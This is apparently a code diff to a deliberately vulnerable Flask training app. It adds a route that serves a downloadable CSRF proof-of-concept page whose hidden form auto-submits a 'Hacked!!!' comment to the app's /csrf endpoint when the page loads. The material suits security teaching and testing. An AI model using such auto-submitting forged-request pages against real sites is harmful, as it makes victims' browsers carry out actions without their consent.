@@ -3,6 +3,7 @@ from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 from sqlalchemy.sql import text
 from loguru import logger
+from io import StringIO
 import subprocess
 import random
 import os
@@ -619,7 +620,7 @@ class CSRF_Comment(db.Model):
 @app.route('/csrf', methods=['GET', 'POST'])
 def csrf():
     if request.method == 'POST':
-        user_name = request.form['author']
+        user_name = g.user.name
         user_comment = request.form['comment']
         new_comment = CSRF_Comment(author=user_name, comment=user_comment)
         db.session.add(new_comment)
@@ -637,11 +638,30 @@ def csrf_delete_comment(id):
     db.session.commit()
     return redirect('/csrf')
 
-########
-# SSRF #
-########
-
-
+@app.route('/csrf/download', methods=['GET', 'POST'])
+def csrf_download():
+    output_string = '''
+    <!DOCTYPE html>
+    <html lang = "en">
+    <head>
+    <meta charset="UTF-8">
+    <title>CSRF Hack</title>
+    </head>
+    <body onload="document.myform.submit()" style="display:none">
+    <form action="''' + request.url[:-9] + ''' " name="myform" method="POST">
+        <input class="form-control" value="Hacked!!!" name="comment" id="comment">
+    </form>
+    </body>
+    </html>
+    '''
+    output_stream = StringIO(output_string)
+    response = Response(
+        output_stream.getvalue(), 
+        mimetype='text/html', 
+        content_type='application/octet-stream',
+    )
+    response.headers["Content-Disposition"] = "attachment; filename=csrf_attack_page.html"
+    return response 
     
 #############
 # DEBUGGING #
